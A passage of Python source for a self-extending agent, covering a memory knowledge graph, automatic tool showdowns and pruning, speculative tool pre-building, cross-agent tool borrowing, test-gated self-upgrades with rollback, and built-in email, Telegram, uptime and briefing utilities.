    threaded through every single call site that mutates a tool/agent/
    decision — trades a little staleness tolerance for zero instrumentation
    burden elsewhere in the file. Returns the rebuilt graph.
    """
    graph = {"built_at": time.time(), "nodes": {}, "edges": []}

    tools = load_tools_index()
    for t in tools:
        _kg_add_node(graph, "tool:" + t["id"], "tool", t.get("idea", ""), {
            "tool_type": t.get("type"), "url": t.get("url"),
            "good_runs": t.get("good_runs", 0), "bad_runs": t.get("bad_runs", 0)
        })

    if os.path.exists(AGENTS_INDEX_FILE):
        for a in load_agents_index():
            _kg_add_node(graph, "agent:" + a["id"], "agent", a.get("purpose", a.get("name", a["id"])), {
                "status": a.get("status"), "trust": a.get("trust")
            })
            for tid in a.get("tool_ids", []):
                _kg_add_edge(graph, "agent:" + a["id"], "tool:" + tid, "built")

    if os.path.exists(DECISIONS_LOG_FILE):
        for d in load_decisions_log():
            node_id = "decision:" + d["id"]
            _kg_add_node(graph, node_id, "decision", d.get("kind", "") + ": " + d.get("reason", ""), {
                "chosen": d.get("chosen")
            })
            chosen_tool = "tool:" + str(d.get("chosen"))
            if chosen_tool in graph["nodes"]:
                _kg_add_edge(graph, node_id, chosen_tool, "resulted_in")
            for c in d.get("candidates", []):
                cand_tool = "tool:" + str(c)
                if cand_tool in graph["nodes"] and cand_tool != chosen_tool:
                    _kg_add_edge(graph, node_id, cand_tool, "considered")

    if os.path.exists(BOUNTY_LEADS_FILE):
        for lead in load_bounty_leads():
            _kg_add_node(graph, "bounty:" + lead["id"], "bounty", lead.get("title", ""), {
                "status": lead.get("status"), "url": lead.get("url")
            })

    lesson_lines = []
    for path in (LESSONS_FILE, GLOBAL_LESSONS_FILE):
        if os.path.exists(path):
            lesson_lines.extend(l.strip("- ").strip() for l in read_file(path).split("\n") if l.strip())
    lesson_lines = list(dict.fromkeys(lesson_lines))  # dedupe, keep order
    tool_corpus = {t["id"]: t.get("idea", "") for t in tools}
    for i, lesson in enumerate(lesson_lines):
        node_id = "lesson:" + str(i)
        _kg_add_node(graph, node_id, "lesson", lesson)
        # Best-effort soft link: which tool is this lesson most likely
        # about? Not authoritative (lessons aren't stored with a tool_id
        # today) — a similarity gate keeps weak/unrelated matches out
        # rather than wiring every lesson to whatever scored highest.
        if tool_corpus:
            ranked = semantic_rank(lesson, tool_corpus)
            if ranked and ranked[0][1] >= LESSON_LINK_THRESHOLD:
                _kg_add_edge(graph, node_id, "tool:" + ranked[0][0], "learned_from")

    save_knowledge_graph(graph)
    return graph

def _ensure_fresh_knowledge_graph():
    graph = load_knowledge_graph()
    if not graph["nodes"] or (time.time() - graph.get("built_at", 0)) > KG_STALE_SECONDS:
        graph = rebuild_knowledge_graph()
    return graph

def query_knowledge_graph(question, top_k=10):
    """
    Answers a natural-language question against the knowledge graph:
    TF-IDF-ranks every node's label against the question, takes the top
    top_k, pulls in their direct (1-hop) neighbors for context, and asks
    the AI to answer using ONLY those retrieved facts — so answers stay
    grounded in what's actually in the graph instead of the model
    guessing/hallucinating tool history. Returns the answer text.
    """
    graph = _ensure_fresh_knowledge_graph()
    if not graph["nodes"]:
        return "Knowledge graph is empty — nothing has been built or logged yet."

    corpus = {nid: n["label"] for nid, n in graph["nodes"].items()}
    ranked = semantic_rank(question, corpus)
    top_ids = [nid for nid, score in ranked[:top_k] if score > 0]
    if not top_ids:
        return "Nothing in memory looks related to that question."

    top_id_set = set(top_ids)
    lines = []
    for nid in top_ids:
        node = graph["nodes"][nid]
        neighbors = [e["relation"] + " " + e["to"] for e in graph["edges"] if e["from"] == nid]
        neighbors += ["<- " + e["relation"] + " " + e["from"] for e in graph["edges"] if e["to"] == nid]
        line = "[" + nid + "] (" + node["type"] + ") " + node["label"]
        if node.get("meta"):
            line += " | " + json.dumps(node["meta"])
        if neighbors:
            line += " | links: " + "; ".join(neighbors[:6])
        lines.append(line)
    context = "\n".join(lines)

    prompt = ("Answer this question using ONLY the facts listed below, which were retrieved from an "
        "agent's memory graph (tools it built, decisions it made, lessons it learned, agents it spawned, "
        "bounty leads it found). Cite node ids like [tool:3] inline when you use a fact. If the facts "
        "don't cover the question, say what's missing instead of guessing.\n\n"
        "Question: " + question + "\n\nFacts:\n" + context)
    answer = ask_ai(prompt)
    return answer if not answer.startswith("ERROR") else "Retrieved " + str(len(top_ids)) + " relevant memory node(s) but couldn't reach the AI to synthesize an answer: " + answer


# ============================================================
# FEATURE A: Competitive tool selection (showdowns + auto-pruning)
# ============================================================
# When two tools solve similar problems, run them head-to-head on the
# same input and keep only the winner. Builds on update_tool_trust /
# retire_tool which already exist.

def tool_showdown(tool_id_a, tool_id_b, test_input=""):
    index = load_tools_index()
    tool_a = next((t for t in index if t["id"] == tool_id_a), None)
    tool_b = next((t for t in index if t["id"] == tool_id_b), None)
    if not tool_a or not tool_b:
        return "Could not find one or both tool ids."

    def _run(tool):
        start = time.time()
        ok, output = run_tool_with_input(tool, test_input) if test_input else run_existing_tool(tool)
        elapsed = time.time() - start
        return ok, output, elapsed

    ok_a, out_a, t_a = _run(tool_a)
    ok_b, out_b, t_b = _run(tool_b)

    if ok_a and not ok_b:
        winner, loser = tool_a, tool_b
    elif ok_b and not ok_a:
        winner, loser = tool_b, tool_a
    elif not ok_a and not ok_b:
        return "Both tools failed on this input. No winner — neither retired."
    else:
        # both succeeded — faster one wins, ties go to higher trust score
        if abs(t_a - t_b) > 0.5:
            winner, loser = (tool_a, tool_b) if t_a < t_b else (tool_b, tool_a)
        else:
            winner, loser = (tool_a, tool_b) if tool_a.get("trust", 0) >= tool_b.get("trust", 0) else (tool_b, tool_a)

    retire_tool(loser, reason="Lost showdown to " + winner["id"] + " (" + winner.get("idea", "")[:60] + ")")
    return ("Showdown: " + winner["id"] + " WINS over " + loser["id"] + ". "
            + "Times: " + tool_a["id"] + "=" + str(round(t_a, 2)) + "s, "
            + tool_b["id"] + "=" + str(round(t_b, 2)) + "s. Loser retired.")


def auto_prune_duplicates():
    """
    Scans tools_index.json for pairs whose 'idea' text is highly similar
    (via the existing semantic_rank/_cosine_sim machinery) and runs a
    showdown between each pair, pruning the loser. Returns a summary.
    """
    index = load_tools_index()
    if len(index) < 2:
        return "Not enough tools to compare."
    seen_pairs = set()
    retired_ids = set()
    results = []
    for i, tool in enumerate(index):
        if tool["id"] in retired_ids:
            continue
        # BUG FIX: semantic_rank() expects a dict of {id: idea_text}, not a
        # list of tool dicts. Passing the list made semantic_rank()'s
        # dict(candidates) call raise "dictionary update sequence element
        # #0 has length 8; 2 is required" (8 == the number of keys on a
        # local tool entry — Python was trying to unpack each whole tool
        # dict as a single key/value pair) every time `prune` ran.
        candidates = {t["id"]: t.get("idea", "") for j, t in enumerate(index)
                      if j != i and t["id"] not in retired_ids}
        if not candidates:
            continue
        ranked = semantic_rank(tool.get("idea", ""), candidates)
        if not ranked:
            continue
        # BUG FIX: semantic_rank() returns (id, score) tuples, not
        # (tool_dict, score) — best_match["id"] below would have raised
        # "string indices must be integers" the moment the call above
        # stopped crashing. Resolve the id back to the actual tool dict.
        best_match_id, score = ranked[0]
        best_match = next((t for t in index if t["id"] == best_match_id), None)
        if not best_match:
            continue
        pair_key = tuple(sorted([tool["id"], best_match_id]))
        if score < 0.6 or pair_key in seen_pairs:
            continue
        seen_pairs.add(pair_key)
        result = tool_showdown(tool["id"], best_match_id)
        results.append(result)
        if "retired" in result.lower():
            loser_id = best_match_id if result.startswith("Showdown: " + tool["id"]) else tool["id"]
            retired_ids.add(loser_id)
    if not results:
        return "No near-duplicate tools found (similarity threshold 0.6)."
    return "\n".join(results)


# ============================================================
# FEATURE B: Predictive pre-building
# ============================================================
# Watches request history and speculatively builds a tool for what it
# expects you'll ask for next, instead of waiting to be asked.

SPECULATIVE_FILE = workpath("speculative_tools.json")

def load_speculative():
    return read_json_file(SPECULATIVE_FILE, [])

def save_speculative(data):
    write_file(SPECULATIVE_FILE, json.dumps(data, indent=2))

def predict_next_need():
    """
    Looks at recent history, asks the AI to guess the next likely
    request, and speculatively builds (but does NOT register) a tool
    for it. Stored in speculative_tools.json for the user to accept or
    discard via 'speculate' / 'acceptspec:' / 'rejectspec:'.
    """
    history = load_history()
    if not history.strip():
        return "No history yet to predict from."
    prompt = ("Past requests (most recent last):\n" + history[-3000:] +
              "\n\nBased on this pattern, what is ONE specific, concrete task the user "
              "is likely to ask for next? Reply with just the task description, one line, "
              "no preamble. If no clear pattern, reply NONE.")
    guess = ask_ai(prompt).strip()
    if guess.upper() == "NONE" or not guess:
        return "No clear pattern to predict from yet."

    existing = load_speculative()
    if any(s["idea"].lower() == guess.lower() for s in existing):
        return "Already have a speculative build for: " + guess

    result = build_and_fix_workflow(guess)
    spec_id = "spec_" + str(int(time.time()))
    existing.append({
        "id": spec_id, "idea": guess, "built_at": time.time(),
        "result_preview": result[:300], "accepted": False
    })
    save_speculative(existing)
    return ("Speculatively built for likely next request: \"" + guess + "\"\n"
            + "Run 'speculate' to review, 'acceptspec: " + spec_id + "' to register it as a real tool, "
            + "or 'rejectspec: " + spec_id + "' to discard it.")

def list_speculative():
    specs = load_speculative()
    if not specs:
        return "No speculative builds yet. Run 'predict' to generate one."
    lines = ["=== Speculative Builds ==="]
    for s in specs:
        status = "ACCEPTED" if s.get("accepted") else "pending"
        lines.append(s["id"] + " [" + status + "]: " + s["idea"])
        lines.append("  " + s["result_preview"][:120].replace("\n", " "))
    return "\n".join(lines)

def accept_speculative(spec_id):
    specs = load_speculative()
    match = next((s for s in specs if s["id"] == spec_id), None)
    if not match:
        return "No speculative build with id " + spec_id
    match["accepted"] = True
    save_speculative(specs)
    return "Marked " + spec_id + " as accepted: \"" + match["idea"] + "\" (already in tools_index from the build step)."

def reject_speculative(spec_id):
    specs = load_speculative()
    specs = [s for s in specs if s["id"] != spec_id]
    save_speculative(specs)
    return "Discarded speculative build " + spec_id + "."


# ============================================================
# FEATURE C: Cross-agent tool lending (internal marketplace)
# ============================================================
# Spawned agents each grow their own tools_index.json independently.
# This lets one agent ask "does anyone already have a tool for X" and
# borrow it (copy + re-register with provenance) instead of rebuilding.

def _all_agent_tool_indexes():
    """Returns list of (agent_id_or_'main', workspace, tools_index_list)."""
    pools = [("main", ".", load_tools_index())]
    for agent in load_agents_index():
        ws = agent.get("workspace", "")
        idx_path = os.path.join(ws, "tools_index.json")
        if os.path.exists(idx_path):
            try:
                pools.append((agent["id"], ws, json.loads(read_file(idx_path))))
            except Exception:
                pass
    return pools

def find_tool_across_fleet(need, exclude_pool="main"):
    """
    Semantic-searches every agent's tool index (plus main's) for a tool
    matching `need`, skipping the pool that's asking. Returns
    (pool_id, workspace, tool_dict) or (None, None, None).
    """
    best = (None, None, None, 0.0)
    for pool_id, ws, index in _all_agent_tool_indexes():
        if pool_id == exclude_pool or not index:
            continue
        ranked = semantic_rank(need, index)
        if ranked and ranked[0][1] > best[3]:
            best = (pool_id, ws, ranked[0][0], ranked[0][1])
    pool_id, ws, tool, score = best
    if tool and score >= 0.5:
        return pool_id, ws, tool
    return None, None, None

def borrow_tool(requesting_pool, need):
    """
    Finds a matching tool anywhere in the fleet and copies its file into
    the requesting pool's generated_tools dir, registering it locally
    with provenance (which agent it was borrowed from).
    """
    source_id, source_ws, tool = find_tool_across_fleet(need, exclude_pool=requesting_pool)
    if not tool:
        return "No matching tool found anywhere in the fleet for: " + need

    # tool["filepath"] as stored already includes the owning agent's
    # workspace prefix (e.g. "generated_agents/agent1/generated_tools/x.py"),
    # so it's usually valid as-is from the main process's cwd. Only fall
    # back to reconstructing a path from source_ws + basename (which drops
    # the generated_tools/ subdirectory) as a last resort — trying that
    # first risked silently matching an unrelated file with the same name
    # sitting directly in the workspace root.
    src_path = tool["filepath"]
    if not os.path.isabs(src_path) and not os.path.exists(src_path):
        alt_path = os.path.join(source_ws, os.path.basename(src_path))
        if os.path.exists(alt_path):
            src_path = alt_path
    if not os.path.exists(src_path):
        return "Found a match (" + tool["id"] + " from " + source_id + ") but its file is missing."

    code = read_file(src_path)
    new_id = "borrowed_" + tool["id"] + "_" + str(int(time.time()))
    os.makedirs(TOOLS_DIR, exist_ok=True)
    dest_path = os.path.join(TOOLS_DIR, new_id + ".py")
    write_file(dest_path, code)

    with _tools_index_lock:
        index = load_tools_index()
        index.append({
            "id": new_id, "idea": tool.get("idea", need), "filepath": dest_path,
            "contract": tool.get("contract", "plain"), "trust": 0,
            "source": "borrowed", "origin_agent": source_id, "origin_tool_id": tool["id"],
        })
        save_tools_index(index)
    return ("Borrowed tool '" + tool["id"] + "' from " + source_id + " (similarity match). "
            + "Registered locally as " + new_id + ".")


# ============================================================
# FEATURE D: Self-generated regression tests for self-upgrades
# ============================================================
# apply_self_upgrade() only checks that main.py still compiles. This
# adds a behavioral check: before patching, ask the AI to write a small
# pytest-free assertion script exercising the OLD behavior the upgrade
# is supposed to preserve/extend, run it before and after the patch,
# and roll back if the new code regresses something the test caught.

def generate_regression_test(function_code, context_description):
    prompt = ("Here is a new Python function being added to an agent's main.py:\n\n"
              + function_code[:2000] +
              "\n\nContext: " + context_description +
              "\n\nWrite a short standalone Python script (no pytest, no imports beyond "
              "stdlib) that defines a few `assert` statements sanity-checking this "
              "function's basic contract (e.g. correct return type, doesn't raise on "
              "a simple/empty input, etc). The function will already be defined in the "
              "same file when this script is appended and run via exec(). "
              "Reply with ONLY the assertion code, no explanation, no markdown fences.")
    return strip_fences(ask_ai(prompt))

def _run_regression_test(main_py_path, test_code):
    """
    Loads main_py_path's source plus the test assertions into one temp
    script and runs it as a subprocess (sandboxed) so a bad test can't
    crash this process. Returns (passed: bool, output: str).
    """
    combined = (
        "import sys\n"
        "with open(" + repr(main_py_path) + ") as _f:\n"
        "    _src = _f.read()\n"
        "_ns = {'__name__': '__regression_test__'}\n"
        "try:\n"
        "    exec(compile(_src, " + repr(main_py_path) + ", 'exec'), _ns)\n"
        "except SystemExit:\n"
        "    pass\n"
        "except Exception as _e:\n"
        "    print('SETUP_ERROR: ' + str(_e)); sys.exit(1)\n"
        "globals().update(_ns)\n"
        + test_code
    )
    tmp_path = workpath("_regression_test_tmp_" + str(os.getpid()) + "_" + str(int(time.time() * 1000)) + ".py")
    write_file(tmp_path, combined)
    try:
        result = subprocess.run(
            ["python3", tmp_path], capture_output=True, text=True, timeout=20,
            preexec_fn=_sandbox_limits if os.name != "nt" else None
        )
        passed = result.returncode == 0
        return passed, (result.stdout + result.stderr)
    finally:
        if os.path.exists(tmp_path):
            os.remove(tmp_path)

def apply_self_upgrade_safe(function_code, context_description=""):
    """
    Behavioral-test-gated version of apply_self_upgrade(). Generates a
    regression test for the new function, applies the patch the normal
    way (backup + py_compile, which already rolls back on syntax
    errors), then ALSO runs the regression test against the patched
    file. If the test fails, rolls back to the pre-patch backup too.
    """
    test_code = generate_regression_test(function_code, context_description)
    ok, msg = apply_self_upgrade(function_code)
    if not ok:
        return False, msg  # already rolled back by apply_self_upgrade
    if not test_code.strip():
        return True, msg + " (no regression test generated — applied without behavioral check)"

    passed, test_output = _run_regression_test(SELF_FILE, test_code)
    if passed:
        return True, msg + "\nRegression test passed:\n" + test_output[:300]

    restore_latest_backup()
    return False, ("Regression test FAILED, rolled back:\n" + test_output[:500] +
                    "\n\nGenerated test was:\n" + test_code[:500])


# BUILT-IN TOOLS
# ============================================================

def check_all_web_tools_uptime():
    """
    Loops every registered web tool and does a lightweight GET against its
    live URL, flagging anything down (non-2xx/3xx status or unreachable).
    Pure HTTP, no browser, no AI call — cheap enough to run anytime.
    Returns a list of dicts: {"id", "idea", "url", "status": "OK"|"DOWN", "detail"}.
    """
    results = []
    for t in load_tools_index():
        if t.get("type") != "web" or not t.get("url"):
            continue
        try:
            resp = requests.get(t["url"], timeout=15, allow_redirects=True)
            if resp.status_code < 400:
                results.append({"id": t["id"], "idea": t["idea"], "url": t["url"], "status": "OK", "detail": "HTTP " + str(resp.status_code)})
            else:
                results.append({"id": t["id"], "idea": t["idea"], "url": t["url"], "status": "DOWN", "detail": "HTTP " + str(resp.status_code)})
        except requests.exceptions.RequestException as e:
            results.append({"id": t["id"], "idea": t["idea"], "url": t["url"], "status": "DOWN", "detail": str(e)[:150]})
    return results

def builtin_web_tools_uptime_check():
    """Console-friendly wrapper: prints a summary, and full detail only for tools that are down."""
    results = check_all_web_tools_uptime()
    if not results:
        print("No web tools registered yet.")
        return
    down = [r for r in results if r["status"] == "DOWN"]
    print("Checked " + str(len(results)) + " web tool(s) — " + str(len(down)) + " down.")
    for r in down:
        print("  DOWN: " + r["id"] + " (" + r["idea"][:50] + ") — " + r["url"] + " — " + r["detail"])

def builtin_website_monitor():
    """Fetches URL from watch_url.txt, compares to last saved version, prints changes."""
    url_file = workpath("watch_url.txt")
    cache_file = workpath("watch_url_cache.txt")
    if not os.path.exists(url_file):
        print("No watch_url.txt found. Create it with a URL to monitor.")
        return
    with open(url_file) as f:
        url = f.read().strip()
    try:
        response = requests.get(url, timeout=15)
        current = response.text[:5000]
    except Exception as e:
        print("Could not fetch URL: " + str(e))
        return
    if os.path.exists(cache_file):
        with open(cache_file) as f:
            previous = f.read()
        if current == previous:
            print("No changes detected at: " + url)
        else:
            print("CHANGE DETECTED at: " + url)
            curr_lines = set(current.splitlines())
            prev_lines = set(previous.splitlines())
            added = curr_lines - prev_lines
            removed = prev_lines - curr_lines
            if added:
                print("Added lines: " + str(len(added)))
                for line in list(added)[:5]:
                    print("  + " + line[:100])
            if removed:
                print("Removed lines: " + str(len(removed)))
                for line in list(removed)[:5]:
                    print("  - " + line[:100])
    else:
        print("First run — saving baseline for: " + url)
    with open(cache_file, "w") as f:
        f.write(current)

def builtin_performance_tracker():
    """Reads history.txt and tools_index.json and prints agent performance summary."""
    print("=== Agent Performance Summary ===")
    tools = []
    if os.path.exists(TOOLS_INDEX_FILE):
        with open(TOOLS_INDEX_FILE) as f:
            tools = json.load(f)
    total_tools = len(tools)
    local = [t for t in tools if t.get("type", "local") == "local"]
    github = [t for t in tools if t.get("type") == "github"]
    web = [t for t in tools if t.get("type") == "web"]
    print("Total tools built: " + str(total_tools))
    print("  Local: " + str(len(local)) + " | GitHub: " + str(len(github)) + " | Web: " + str(len(web)))
    if tools:
        best = max(tools, key=lambda t: t.get("good_runs", 0))
        worst = max(tools, key=lambda t: t.get("bad_runs", 0))
        print("Most successful: " + best["id"] + " (" + str(best.get("good_runs", 0)) + " good runs) — " + best["idea"][:50])
        print("Most failing: " + worst["id"] + " (" + str(worst.get("bad_runs", 0)) + " bad runs) — " + worst["idea"][:50])
    if os.path.exists(COUSAGE_FILE):
        with open(COUSAGE_FILE) as f:
            cousage = json.load(f)
        if cousage:
            top_pair = max(cousage, key=cousage.get)
            print("Most used combo: " + top_pair.replace("|", " + ") + " (" + str(cousage[top_pair]) + " times)")
    if os.path.exists(workpath("history.txt")):
        with open(workpath("history.txt")) as f:
            history = f.read()
        builds = history.count("build:")
        goals = history.count("goal:")
        makes = history.count("make:")
        successes = history.count("successfully")
        failures = history.count("Could not") + history.count("Failed")
        print("build: commands: " + str(builds) + " | goal: " + str(goals) + " | make: " + str(makes))
        if successes + failures > 0:
            rate = round(100 * successes / (successes + failures), 1)
            print("Estimated success rate: " + str(rate) + "%")
    if os.path.exists(LESSONS_FILE):
        with open(LESSONS_FILE) as f:
            lessons = [l for l in f.read().splitlines() if l.strip()]
        print("Lessons learned: " + str(len(lessons)))
    if os.path.exists(FAILURE_COUNTS_FILE):
        with open(FAILURE_COUNTS_FILE) as f:
            counts = json.load(f)
        if counts:
            top_fail = max(counts, key=counts.get)
            print("Most common failure: " + top_fail + " (" + str(counts[top_fail]) + " times)")
    print("=================================")

def builtin_dependency_map():
    """Prints a text-based co-usage map of tools."""
    tools = {}
    if os.path.exists(TOOLS_INDEX_FILE):
        with open(TOOLS_INDEX_FILE) as f:
            for t in json.load(f):
                tools[t["id"]] = t["idea"][:40]
    cousage = {}
    if os.path.exists(COUSAGE_FILE):
        with open(COUSAGE_FILE) as f:
            cousage = json.load(f)
    if not tools:
        print("No tools built yet.")
        return
    print("=== Tool Co-usage Map ===")
    for tool_id, idea in tools.items():
        related = []
        for pair, count in sorted(cousage.items(), key=lambda x: -x[1]):
            parts = pair.split("|")
            if tool_id in parts:
                other = parts[1] if parts[0] == tool_id else parts[0]
                related.append(other + "(" + str(count) + "x)")
        line = tool_id + ": " + idea
        if related:
            line += "\n    └── used with: " + ", ".join(related)
        print(line)
    print("=========================")

def builtin_failure_predictor():
    """Predicts which tool is most likely to fail next based on trust scores."""
    if not os.path.exists(TOOLS_INDEX_FILE):
        print("No tools_index.json found.")
        return
    with open(TOOLS_INDEX_FILE) as f:
        tools = json.load(f)
    if not tools:
        print("No tools built yet.")
        return
    print("=== Failure Risk Prediction ===")
    scored = []
    for t in tools:
        good = t.get("good_runs", 0)
        bad = t.get("bad_runs", 0)
        total = good + bad
        risk = bad / total if total > 0 else 0.5
        scored.append((risk, t))
    scored.sort(key=lambda x: -x[0])
    for risk, t in scored:
        bar = "█" * int(risk * 10) + "░" * (10 - int(risk * 10))
        label = "HIGH" if risk > 0.6 else ("MEDIUM" if risk > 0.3 else "LOW")
        print(t["id"] + " [" + bar + "] " + str(round(risk * 100)) + "% " + label + " — " + t["idea"][:45])
    if scored:
        print("\nMost likely to fail next: " + scored[0][1]["id"] + " — " + scored[0][1]["idea"])
    print("===============================")

def send_email(to_email, subject, body):
    """
    Reusable Gmail SMTP sender — pulled out of builtin_gmail_sender()'s
    inline logic so other features can send mail directly (e.g. emailing a
    website bug report) without having to write an email_draft.txt file
    first. builtin_gmail_sender() below now calls this instead of
    duplicating the SMTP code. Returns (True, None) on success or
    (False, error_message) on failure — callers decide how to report that,
    rather than this function printing directly, so it's usable from
    contexts that aren't just "typed a command in the console."
    """
    agent_email = os.environ.get("AGENT_EMAIL")
    agent_password = os.environ.get("AGENT_APP_PASSWORD")
    if not agent_email or not agent_password:
        return False, "AGENT_EMAIL or AGENT_APP_PASSWORD not set in secrets."
    try:
        msg = MIMEMultipart()
        msg["From"] = agent_email
        msg["To"] = to_email
        msg["Subject"] = subject
        msg.attach(MIMEText(body, "plain"))
        last_err = None
        for _attempt in range(3):
            server = None
            try:
                server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
                server.login(agent_email, agent_password)
                server.sendmail(agent_email, to_email, msg.as_string())
                server.quit()
                return True, None
            except Exception as e:
                last_err = e
                if server is not None:
                    try:
                        server.close()
                    except Exception:
                        pass
                time.sleep(3)
        return False, "Could not send email after 3 attempts: " + str(last_err)
    except Exception as e:
        return False, "Could not send email: " + str(e)

def builtin_gmail_sender():
    """Reads email_draft.txt and sends via Gmail SMTP.
    Format: line 1 = TO:email (optional), line 2 = subject, rest = body."""
    draft_file = workpath("email_draft.txt")
    if not os.path.exists(draft_file):
        print("No email_draft.txt found.")
        print("Create it with: TO:recipient@email.com on line 1 (optional), subject on next line, body below.")
        return
    agent_email = os.environ.get("AGENT_EMAIL")
    if not agent_email:
        print("AGENT_EMAIL or AGENT_APP_PASSWORD not set in secrets.")
        return
    with open(draft_file) as f:
        lines = f.read().splitlines()
    if not lines:
        print("email_draft.txt is empty.")
        return
    to_email = agent_email
    if lines[0].lower().startswith("to:"):
        to_email = lines[0][3:].strip()
        lines = lines[1:]
    subject = lines[0].strip() if lines else "(no subject)"
    body = "\n".join(lines[1:]) if len(lines) > 1 else ""
    ok, err = send_email(to_email, subject, body)
    if ok:
        print("Email sent to " + to_email + " — Subject: " + subject)
    else:
        print(err)

def notify_telegram(message):
    """
    Callable counterpart to builtin_telegram_notifier(): sends `message`
    directly via the Telegram Bot API instead of requiring a
    telegram_msg.txt file first. Lets any tool, tool chain, or agent
    push a notification (build finished, key registered, self-upgrade
    blocked/applied, etc.) without a manual file-write step in between.
    Returns (success, info_message).
    """
    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN")
    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
    if not bot_token or not chat_id:
        return False, "TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set in Replit secrets."
    message = (message or "").strip()
    if not message:
        return False, "Message is empty."
    try:
        url = "https://api.telegram.org/bot" + bot_token + "/sendMessage"
        response = requests.post(url, json={"chat_id": chat_id, "text": message[:4000]}, timeout=15)
        data = response.json()
        if data.get("ok"):
            return True, "Telegram message sent."
        return False, "Telegram error: " + str(data)
    except Exception as e:
        return False, "Could not send Telegram message: " + str(e)

def builtin_telegram_notifier():
    """Reads TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID from env and sends telegram_msg.txt."""
    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN")
    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
    if not bot_token or not chat_id:
        print("TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set in Replit secrets.")
        return
    msg_file = workpath("telegram_msg.txt")
    if not os.path.exists(msg_file):
        print("No telegram_msg.txt found. Create it with your message.")
        return
    with open(msg_file) as f:
        message = f.read().strip()
    if not message:
        print("telegram_msg.txt is empty.")
        return
    try:
        url = "https://api.telegram.org/bot" + bot_token + "/sendMessage"
        response = requests.post(url, json={"chat_id": chat_id, "text": message[:4000]}, timeout=15)
        data = response.json()
        if data.get("ok"):
            print("Telegram message sent successfully.")
        else:
            print("Telegram error: " + str(data))
    except Exception as e:
        print("Could not send Telegram message: " + str(e))

def builtin_history_archiver():
    """Checks if history.txt exceeds 50KB and archives it if so."""
    history_file = workpath("history.txt")
    if not os.path.exists(history_file):
        print("No history.txt found.")
        return
    size_kb = os.path.getsize(history_file) / 1024
    print("Current history.txt size: " + str(round(size_kb, 1)) + " KB")
    if size_kb < 50:
        print("Under 50KB limit — no archiving needed.")
        return
    archive_name = workpath("history_archive_" + str(int(time.time())) + ".txt")
    shutil.copy(history_file, archive_name)
    with open(history_file, "w") as f:
        f.write("")
    print("Archived to " + archive_name + " and started fresh history.txt")

def builtin_webpage_to_text():
    """Reads URL from url_to_pdf.txt and saves clean text to output_page.txt."""
    url_file = workpath("url_to_pdf.txt")
    if not os.path.exists(url_file):
        print("No url_to_pdf.txt found. Create it with the URL to convert.")
        return
    with open(url_file) as f:
        url = f.read().strip()
    try:
        response = requests.get(url, timeout=15)
        text = re.sub(r"<[^>]+>", " ", response.text)
        text = re.sub(r"\s+", " ", text).strip()
        output_file = workpath("output_page.txt")
        with open(output_file, "w") as f:
            f.write("URL: " + url + "\n\n" + text[:10000])
        print("Saved clean text from " + url + " to " + output_file)
        print("Content length: " + str(len(text)) + " characters")
    except Exception as e:
        print("Could not fetch page: " + str(e))

def builtin_github_actions_monitor():
    """Prints current GitHub Actions minutes used this month."""
    headers = github_headers()
    if headers is None:
        print("GITHUB_TOKEN not set in secrets.")
        return
    try:
        user_resp = requests.get("https://api.github.com/user", headers=headers, timeout=15)
        username = _github_json(user_resp).get("login", "")
        if not username:
            print("Could not determine GitHub username.")
            return
        billing_resp = requests.get(
            "https://api.github.com/users/" + username + "/settings/billing/actions",
            headers=headers, timeout=15
        )
        data = _github_json(billing_resp)
        if "total_minutes_used" not in data:
            print("Could not fetch billing data (may require org account).")
            print("Response: " + str(data)[:200])
            return
        used = data.get("total_minutes_used", 0)
        included = data.get("included_minutes", 0)
        paid = data.get("total_paid_minutes_used", 0)
        remaining = max(0, included - used)
        print("=== GitHub Actions Usage ===")
        print("Minutes used: " + str(used) + " / " + str(included) + " free")
        print("Remaining: " + str(remaining) + " | Paid extra: " + str(paid))
        if included > 0:
            pct = round(100 * used / included, 1)
            bar_pct = min(pct, 100)
            bar = "█" * int(bar_pct / 10) + "░" * (10 - int(bar_pct / 10))
            print("Usage: [" + bar + "] " + str(pct) + "%")
        print("============================")
    except Exception as e:
        print("Could not fetch GitHub Actions usage: " + str(e))

def builtin_daily_briefing():
    """Prints a morning briefing: weather, recent activity, tool health, lessons."""
    print("=== Daily Briefing — " + time.strftime("%Y-%m-%d %H:%M") + " ===")
    # Weather
    city_file = workpath("weather_city.txt")
    city = None
    if os.path.exists(city_file):
        with open(city_file) as f:
            city = f.read().strip() or None
    if not city:
        print("Weather: weather_city.txt is missing or empty. Create it with your city name.")
    else:
        try:
            weather_resp = requests.get(
                "https://wttr.in/" + city.replace(" ", "+") + "?format=3",
                timeout=10
            )
            print("Weather: " + weather_resp.text.strip())
        except Exception:
            print("Weather: unavailable")
    # Recent history
    print("\nRecent activity:")
    if os.path.exists(workpath("history.txt")):
        with open(workpath("history.txt")) as f:
            lines = f.read().strip().splitlines()
        user_lines = [l for l in lines if l.startswith("User asked:")][-3:]
        for line in user_lines:
            print("  " + line[:80])
    else:
        print("  No history yet.")
    # Tool health
    print("\nTool health:")
    if os.path.exists(TOOLS_INDEX_FILE):
        with open(TOOLS_INDEX_FILE) as f:
            tools = json.load(f)
        total = len(tools)
        healthy = sum(1 for t in tools if t.get("good_runs", 0) >= t.get("bad_runs", 0))
        print("  " + str(total) + " tools total, " + str(healthy) + " healthy")
        at_risk = [t for t in tools if t.get("bad_runs", 0) > t.get("good_runs", 0)]
        if at_risk:
            print("  At risk: " + ", ".join(t["id"] for t in at_risk))
    else:
        print("  No tools yet.")
    # Pending ideas
    if os.path.exists(PENDING_IDEAS_FILE):
        with open(PENDING_IDEAS_FILE) as f:
            pending = json.load(f)
        if pending:
            print("\nPending dreamer ideas: " + str(len(pending)))
    # Lessons
    if os.path.exists(LESSONS_FILE):
        with open(LESSONS_FILE) as f:
            lessons = [l for l in f.read().splitlines() if l.strip()]
        print("Lessons learned: " + str(len(lessons)))
    print("==========================================")

# ============================================================
# AUTO-CREATE DEFAULT CONFIG FILES
# ============================================================

def ensure_default_files():
    defaults = {
        "watch_url.txt": "https://example.com",
        "weather_city.txt": "",
        "email_draft.txt": "TO:your@email.com\nSubject: Test from Agent\n\nHello! This is a test email from your agent.",
